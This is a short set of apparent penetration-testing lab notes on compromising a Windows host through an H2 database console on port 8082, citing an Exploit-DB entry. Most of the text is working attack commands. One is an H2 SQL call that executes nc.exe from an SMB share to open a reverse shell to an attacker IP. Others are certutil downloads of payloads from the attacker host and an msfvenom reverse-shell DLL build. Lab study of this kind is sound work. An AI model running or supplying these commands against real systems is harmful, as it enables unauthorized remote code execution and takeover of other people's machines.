#windows  #H2_DB

- Nmap port shows H2 db is running at 8082 port.
- Searching on google lead us to below steps 
	- https://www.exploit-db.com/exploits/49384

```powershell
python2 smbserver.py -smb2support Share .

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.160/Share/nc.exe -e cmd.exe 192.168.45.160 443").getInputStream()).useDelimiter("\\Z").next()');


set PATH=%SystemRoot%\system32;%SystemRoot%;

certutil -urlcache -f http://192.168.45.160/psf.exe psf.exe - did not worked

msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.160 LPORT=8082

certutil -urlcache -split -f http://192.168.45.160/exploit.ps1 exploit.ps1

```


